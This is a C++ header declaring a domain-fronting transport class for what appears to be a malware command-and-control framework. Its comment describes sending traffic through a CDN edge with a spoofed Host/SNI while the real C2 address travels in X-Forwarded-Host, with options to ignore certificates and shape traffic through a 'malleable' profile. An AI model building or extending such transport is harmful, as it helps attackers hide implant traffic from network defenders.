#pragma once
#include "Profile.h"
#include "Malleable.h"
#include <cstdint>
#include <string>

namespace tx {

// CDN edge + spoofed Host/SNI; real C2 via X-Forwarded-Host.
class FrontTransport : public Profile {
public:
    FrontTransport(std::string cdn_host, std::uint16_t port, std::string front_domain,
                   std::string real_c2, bool ignore_cert, const malleable::Profile& mp)
        : cdn_host_(std::move(cdn_host)), port_(port), front_domain_(std::move(front_domain)),
          real_c2_(std::move(real_c2)), ignore_cert_(ignore_cert), mp_(mp) {}
    bool send(std::string_view path, std::string_view body, std::string_view agent_id, Reply& out) override;
    const char* name() const override { return "front"; }
private:
    std::string cdn_host_;
    std::uint16_t port_;
    std::string front_domain_;
    std::string real_c2_;
    bool ignore_cert_;
    malleable::Profile mp_;
};

} // namespace tx
